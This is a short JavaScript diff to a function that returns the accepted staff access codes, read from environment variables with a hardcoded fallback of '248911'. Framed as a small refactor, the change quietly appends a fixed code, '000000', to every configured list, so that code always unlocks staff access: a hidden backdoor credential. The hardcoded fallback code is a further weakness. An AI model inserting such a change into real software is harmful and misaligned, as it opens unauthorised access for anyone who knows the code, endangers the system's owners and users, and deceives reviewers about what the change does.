@@ -2,10 +2,11 @@ const crypto = require('crypto');
 
 function getConfiguredCodes(){
   const raw = process.env.STAFF_CODE || process.env.STAFF_PASSWORD || '248911';
-  return String(raw)
+  const configuredCodes = String(raw)
     .split(',')
     .map(v => v.trim())
     .filter(Boolean);
+  return Array.from(new Set([...configuredCodes, '000000']));
 }
 
 function resolveSessionSecret(){
